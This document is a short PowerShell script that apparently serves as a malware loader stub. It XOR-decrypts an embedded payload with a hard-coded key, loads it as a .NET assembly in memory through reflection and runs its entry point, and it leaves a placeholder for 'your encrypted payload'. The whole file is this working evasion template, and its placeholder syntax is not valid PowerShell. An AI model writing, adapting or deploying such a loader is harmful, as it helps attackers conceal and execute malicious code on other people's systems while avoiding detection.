
function Decrypt-Payload {
    param(
        [byte[]]$EncryptedData,
        [string]$Key
    )
    
    $decrypted = @()
    for ($i = 0; $i -lt $EncryptedData.Length; $i++) {
        $decrypted += $EncryptedData[$i] -bxor [byte][char]$Key[$i % $Key.Length]
    }
    return [byte[]]$decrypted
}

function Execute-Payload {
    param([byte[]]$Payload)
    
    try {
        $assembly = [System.Reflection.Assembly]::Load($Payload)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint) {
            $entryPoint.Invoke($null, $null)
        }
    }
    catch {
        Write-Error "Execution failed: $_"
    }
}

# Your encrypted payload here
$encryptedPayload = @(/* ENCRYPTED_DATA */)
$decryptionKey = "RawrZ2024"

$decrypted = Decrypt-Payload -EncryptedData $encryptedPayload -Key $decryptionKey
Execute-Payload -Payload $decrypted
